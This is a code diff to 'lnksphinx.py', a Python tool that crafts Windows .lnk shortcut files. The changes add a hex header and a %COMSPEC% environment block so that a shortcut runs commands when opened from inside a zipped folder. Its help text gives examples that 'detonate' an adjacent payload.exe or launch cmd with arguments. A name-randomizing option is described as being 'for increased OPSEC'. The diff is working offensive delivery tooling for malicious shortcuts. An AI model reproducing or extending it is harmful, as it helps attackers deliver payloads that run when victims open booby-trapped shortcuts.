@@ -36,6 +36,7 @@ def create_lnk(target_file, out_file, icon_index=None, args=None, randomize=Fals
     NormalHeaderZip = "9B020800"
     IconHeaderZip = "CB020800"
     ArgsIconHeaderZip = "EB020800"
+    ArgsHeaderZip = "AB020800"
 
     # Generate a random 6-character string if randomize is True, else use originalName
     if randomize:
@@ -56,25 +57,28 @@ def create_lnk(target_file, out_file, icon_index=None, args=None, randomize=Fals
 
     # Determine header based on icon_index and args
     if args and icon_index and zipped:
-        print("DEBUG: Using ArgsIconHeaderZip")
+        #print("DEBUG: Using ArgsIconHeaderZip")
         header = ArgsIconHeaderZip
     elif icon_index and zipped:
-        print("DEBUG: Using IconHeaderZip")
+        #print("DEBUG: Using IconHeaderZip")
         header = IconHeaderZip
+    elif args and zipped:
+        #print("DEBUG: Using NormalHeaderZip")
+        header = ArgsHeaderZip
     elif zipped:
-        print("DEBUG: Using NormalHeaderZip")
+        #print("DEBUG: Using NormalHeaderZip")
         header = NormalHeaderZip
     elif args and icon_index:
-        print("DEBUG: Using ArgsIconHeader")
+        #print("DEBUG: Using ArgsIconHeader")
         header = ArgsIconHeader
     elif icon_index:
-        print("DEBUG: Using IconHeader")
+        #print("DEBUG: Using IconHeader")
         header = IconHeader
     elif args:
-        print("DEBUG: Using ArgsHeader")
+        #print("DEBUG: Using ArgsHeader")
         header = ArgsHeader
     else:
-        print("DEBUG: Using NormalHeader")
+        #print("DEBUG: Using NormalHeader")
         header = NormalHeader
 
     # Construct the bigBlob with selected header and Blob parts
@@ -93,7 +97,7 @@ def create_lnk(target_file, out_file, icon_index=None, args=None, randomize=Fals
     if len(modifiedBlob) % 2 != 0:
         modifiedBlob += '00'
 
-    # add support for execution from compressed location
+    # add support for execution from compressed location by appending environment block with reference to %COMSPEC% for resolve at runtim. Must be used in conjunction with hasExpString link header flag to prevent error
     environmentBlob = ("14030000010000A025434F4D53504543250000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000250043004F004D00530050004500430025000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000010000000050000A025000000DD0000001C0000000B0000A0774EC11AE7025D4EB7442EB1AE5198B7DD00000060000000030000A058000000000000006465736B746F702D32386568393964005A3805B13F4A4140A5D0D24595DCF10E403793BD9114EF1196E6302432F8FB2D5A3805B13F4A4140A5D0D24595DCF10E403793BD9114EF1196E6302432F8FB2DCE000000090000A08900000031535053E28A5846BC4C3843BBFC139326986DCE6D00000004000000001F0000002E00000053002D0031002D0035002D00320031002D0033003800330036003700330030003600320030002D0032003900330032003200370039003000370034002D003400390030003500310032003300360035002D0031003000300031000000000000003900000031535053B1166D44AD8D7048A748402EA43D788C1D000000680000000048000000A80E48DE000000000000300300000000000000000000000000000000")
     if zipped:
         modifiedBlob = modifiedBlob + environmentBlob
@@ -109,15 +113,17 @@ def main():
     # Initialize argument parser
     parser = argparse.ArgumentParser(
         description="Create a .lnk with relative target path\n\n"
-                    "Example usage:\n"
-                    "  python3 lnksphinx.py cmd.exe Update -i 49 -c \"/c calc.exe\" -r",
+                    "Example usage to detonate adjacent file:\n"
+                    "  python3 lnksphinx.py payload.exe Update -i 49 -r\n"
+                    "Example usage to detonate from compressed location:\n"
+                    "  python3 lnksphinx.py %COMSPEC% Update -i 49 -c \"/c calc.exe\" -z -r",
         formatter_class=argparse.RawTextHelpFormatter
     )
     parser.add_argument("target_file", help="Relative target file")
     parser.add_argument("out_file", help="Output file name")
     parser.add_argument("-i", "--icon", help="Optional icon index (hex)")
     parser.add_argument("-c", "--args", help="Optional arguments to include in the .lnk")
-    parser.add_argument("-z", "--zip", action="store_true", help="Optional arguments to add execution support from compressed folders")
+    parser.add_argument("-z", "--zip", action="store_true", help="Optional arguments to add execution support from compressed folders.")
     parser.add_argument("-r", "--randomize", action="store_true", help="Randomize name of the unresolvable link target for increased OPSEC. Default : citrix .exe")
 
 
